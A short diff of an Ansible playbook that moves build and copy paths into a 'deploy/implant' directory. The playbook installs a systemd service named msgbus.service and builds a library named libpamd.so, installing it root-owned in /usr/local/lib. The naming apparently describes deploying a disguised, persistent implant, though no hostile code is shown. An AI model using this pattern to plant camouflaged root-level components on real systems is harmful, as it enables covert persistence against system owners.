@@ -23,7 +23,7 @@
         update: yes
 
     - name: Copy systemd job to systemd 
-      copy: remote_src=True src=/tmp/shelly/deploy/msgbus.service dest=/etc/systemd/system/msgbus.service
+      copy: remote_src=True src=/tmp/shelly/deploy/implant/msgbus.service dest=/etc/systemd/system/msgbus.service
 
     - name: Give root perms to file
       ansible.builtin.file:
@@ -53,13 +53,13 @@
 
     - name: Build libpamd
       make:
-        chdir: /tmp/shelly/deploy
+        chdir: /tmp/shelly/deploy/implant
         target: all
-        file: /tmp/shelly/deploy/Makefile
+        file: /tmp/shelly/deploy/implant/Makefile
 
     - name: Copy libpamd file
       copy:
-        src: '/tmp/shelly/deploy/libpamd.so'
+        src: '/tmp/shelly/deploy/implant/libpamd.so'
         dest: '/usr/local/lib/libpamd.so'
         owner: root
         group: root
